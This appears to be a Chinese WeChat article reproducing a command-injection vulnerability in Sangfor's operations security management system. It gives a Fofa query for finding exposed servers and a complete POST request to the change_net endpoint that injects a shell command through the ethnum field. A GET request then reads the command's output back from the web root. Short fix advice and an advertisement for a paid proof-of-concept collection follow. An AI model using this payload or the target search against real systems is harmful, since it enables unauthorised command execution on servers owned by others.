---
title: 深信服运维安全管理系统 change_net 命令执行漏洞
url: https://mp.weixin.qq.com/s/F7kHn038WxtvPKS683ajmA
source: Doonsec's feed
date: 2026-09-01
fetch_date: 2026-09-02T06:38:20.838869
---

# 深信服运维安全管理系统 change_net 命令执行漏洞

# 深信服运维安全管理系统 change\_net 命令执行漏洞

北雪网络安全
北雪网络安全

北雪网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**

01

更多内容

#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296

02

搜索引擎

Fofa: product="SANGFOR-运维安全管理系统"

03

漏洞复现

漏洞概述：深信服运维安全管理系统 change\_net 接口存在命令执行漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该

漏洞版本的深信服运维安全管理系统的服务器。

影响版本：<=3.0.12 20241106

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgjzxJDIvMu9niayOibChC8qhXLX9WB7KV9SsWQicyNEmAiac6f8YhXsJ7HTvbRQsCQNYGj98srXLFYRCibEYq8RkWIl7sjTibQvF2ZM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgPWuPuQXyGTVPynjMaenHMKQ6JuDTWM5x1Uhwdo7zhQxU9R0m5660W1xKhOpwhoMOicoQsveDAhIaGBLH0HIFYbic7wCM5EP8wc/640?wx_fmt=png&from=appmsg)

```
POST /fort/system;help/netConfig/change_net HTTP/1.1Host:Content-Type: application/x-www-form-urlencodedConnection: keep-aliveCache-Control: max-age=0sec-ch-ua: "Not(A:Brand";v="8","Chromium";v="144", "Google Chrome";v="144"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "Windows"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, br, zstdAccept-Language: zh-CN,zh;q=0.9 sta=static&ipv=4&ethnum=;id | tee /usr/local/tomcat/webapps/fort/trust/version/hello1.txt;&address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3
```

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgf7yO2ahl4Me03ND3VIf0Olldq9ZzxfmGyQVjNNAcQDm86JeEC1G0OlgwGic38S5Lic0RPrOxicZcYbRZMUibZJzGfeiaBk1hNIxtM/640?wx_fmt=png&from=appmsg)

```
GET /fort/trust/version/hello1.txt HTTP/1.1Host:
```

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjibal4Rp3nDHq3dgcHISmPHgnwjjk33DqR6CficOOXAJNSZNYHECIHYVYRchUEASRDlSicdIdbria7lcYPUN5UjS0k11aQh1iciataQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjQQQ2Loiaa7RlCtZBRnJApdKMUjkQ11x5LPxEqiadVmtKwOIhHiaOeTomNy7omVyInqE54zwqg06oH8utWy0qYjGqLfvmCsgPsgY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhIr5OBfLAtHfM9EmsHw8nIFQiacHCyR9T2jqNFc9tAQrQAlJxribZLaYJAgZyo2739CTx7u91hPYAF2offO6p3RGPEVWqHjgPpk/640?wx_fmt=png&from=appmsg)

04

修复建议

1、关闭互联网暴露面或接口设置访问权限

2、升级至安全版本

05

内部圈子

🛠️ 【知名漏洞实战圈，纯干货】🛠️

还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！
目前已更新poc数量2500+

![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjPI25XhKpBW9QCsahwuU67rJ9VqibAX1UciaJc7iasCFFsiaKQLhXkmLuW3IploPvkOBVcD4RWRbCHGC7bC00gOoOBMicaHYsQlnz4/640?wx_fmt=png&from=appmsg)

🎯 适用场景

**▫️渗透测试**▫️企业漏洞自查****▫️****攻防演练****▫️****安全服务****▫️****合规运营****

![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjgpaypdpAVZe7qib52a01DJDAiatRmiaNoiaeWzLGXHr9hPa29sp1sDqCeDiasUqsHDbd4BRQoSjbeIWB4yAu2zRnjpPOPicxROBCas/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjnJSMCbXtribgZvAJkvYkoOvpBvPF0qhoF9YzA6fEqEfv9BgW7zHvsKKlzrgAFaGiaMSJk9eObsFyRqjoKl6QuVVC65jmCxZnSQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过